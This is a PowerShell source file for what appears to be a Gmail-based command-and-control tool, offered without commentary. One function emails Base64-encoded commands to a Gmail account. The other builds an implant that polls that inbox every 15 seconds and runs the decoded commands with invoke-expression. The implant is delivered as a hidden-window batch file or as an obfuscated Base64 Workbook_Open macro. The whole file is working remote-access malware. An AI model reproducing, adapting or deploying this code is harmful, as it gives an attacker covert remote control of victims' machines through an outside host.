

Function Send-PSGCommand{

[CmdletBinding()]
Param(
[Parameter(Mandatory=$True)]
[string]$EmailAddress,
[Parameter(Mandatory=$True)]
[string]$Password,
[Parameter(Mandatory=$True)]
[string]$ClientList,
[Parameter(Mandatory=$True)]
[string]$Command
)
$username = $EmailAddress
Function Sendit(){
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$to = $username
$from = $username
$subject = $command
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($subject)
$EncodedText =[Convert]::ToBase64String($Bytes)
$subject = $EncodedText
$body = $message|out-string
$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password);
$smtp.send($from, $to, $subject, $body)
}

$command = "'" + '$var' + '= ' + $command + ';send-command ' + '$var' + ' ~' + $ClientList + "'"
sendit $command
}


Function New-PSGPayload{


[CmdletBinding()]
Param(
[Parameter(Mandatory=$True)]
[string]$EmailAddress,
[Parameter(Mandatory=$True)]
[string]$Password,
[Parameter(Mandatory=$True)]
[string]$ClientID,
[Parameter(Mandatory=$True)]
[string]$Type,
[Parameter(Mandatory=$True)]
[string]$OutFile
)

Function Convert-ToBase64($Text){
$Text = [System.Text.Encoding]::Unicode.GetBytes($Text)
$Text =[Convert]::ToBase64String($Text)
$text
}

$OneLiner = {cls;$username_ = '_EMAIL_';$password_ = '_password_';$client_name = '_CLIENT_';Function sendmail($message){$SMTPServer = 'smtp.gmail.com';$SMTPPort = '587';$to = $username_;$from = $username_;$subject = 'Email from Client ' + $client_name;$body = $message|out-string;$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);$smtp.EnableSSL = $true;$smtp.Credentials = New-Object System.Net.NetworkCredential($username_, $password_);$smtp.send($from, $to, $subject, $body)};$check = $null;While($true){start-sleep -s 15;$url = 'https://mail.google.com/mail/feed/atom';$webclient = new-object System.Net.WebClient;$username_01 = $username_.split('@')[0];$webclient.Credentials = new-object System.Net.NetworkCredential($username_01, $password_);$xml = $webclient.DownloadString($url);$xml = [xml]$xml;$inbox = $xml.feed.entry;$object_01 = New-object psobject -property @{Title = $msg.title;Time = $msg.issued};$array = @();foreach ($msg in $inbox){$object_001 = $object_01|select-object *;$issued = $msg.issued;$title = $msg.title;$title = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($title));$object_001.Time = $issued;$object_001.Title = $title;$array += $object_001};$finder = $array|where-object {$_.Title -match $client_name}|sort-object -property Time |select-object -last 1;if($check) {if ([datetime]$finder.Time -eq [datetime]$check){continue}};$command = $finder.title.split('~')[0];invoke-expression $command;$check = $finder.Time}}
$OneLiner = $OneLiner -replace '_EMAIL_', $EmailAddress
$OneLiner = $OneLiner -replace '_password_', $password
$OneLiner = $OneLiner -replace '_CLIENT_', $ClientID





Function batch($OneLiner){
$line = 'powershell.exe -NoP -NonI -W Hidden invoke-command -scriptblock ' +  '"' + '{' + $OneLiner + '}' + '"'
$line|out-string|Out-file $OutFile -enc ascii
}

Function Macro($OneLiner){

echo "Sub Workbook_Open()" > $OutFile
echo "Dim str As String" >> $OutFile
echo "Dim exec As String" >> $OutFile

$OneLiner = Convert-ToBase64 $OneLiner
$code = [regex]::split($OneLiner, '(.{48})') | ? {$_}
$count = 0
foreach($line in $code){
if($count -eq 0){
'str = "' + $line + '"' >> $OutFile
$count = 1
}else{'str = str + "' + $line + '"' >> $OutFile}}

$line = {exec = "powershell.exe -NoP -NonI -W Hidden -command"}
$line|Out-file -append $OutFile
$line = {exec = exec + " ""$code = '""" "&" str "&" """'|out-string;"}
$line = $line -replace '"&"', '&'
$line|Out-file -append $OutFile
$line = {exec = exec + "$asc = [System.Text.Encoding]::"}
$line|Out-file -append $OutFile
$line = {exec = exec + "Unicode.GetString([System.Convert]::"}
$line|Out-file -append $OutFile
$line = {exec = exec + "FromBase64String($code));"}
$line|Out-file -append $OutFile
$line = {exec = exec + "$asc;"}
$line|Out-file -append $OutFile
$line = {exec = exec + "invoke-expression ""$asc"" "}
$line|Out-file -append $OutFile
$line = {Shell (exec)}
$line|Out-file -append $OutFile
$line = 'End Sub'
$line|Out-file -append $OutFile
}


If($Type -eq 'batch'){batch $OneLiner}
ElseIf($Type -eq 'macro'){macro $OneLiner}
Else{Write-Host "Type Must be batch or macro"}

}